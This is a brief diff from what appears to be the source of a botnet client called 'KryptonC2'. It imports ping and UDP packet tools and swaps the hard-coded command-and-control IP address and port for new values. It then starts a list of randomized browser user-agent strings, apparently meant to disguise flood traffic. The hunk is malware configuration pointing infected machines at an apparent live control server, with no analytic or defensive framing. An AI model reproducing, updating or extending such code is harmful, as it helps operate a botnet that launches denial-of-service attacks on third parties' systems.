@@ -10,8 +10,8 @@ from uuid import UUID, uuid4
 from icmplib import ping as pig
 from scapy.layers.inet import UDP
     
-KRYPTONC2_ADDRESS  = "92.113.146.195"
-KRYPTONC2_PORT = 25656
+KRYPTONC2_ADDRESS  = "45.250.255.56"
+KRYPTONC2_PORT = 17024
 
 base_user_agents = [
     'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
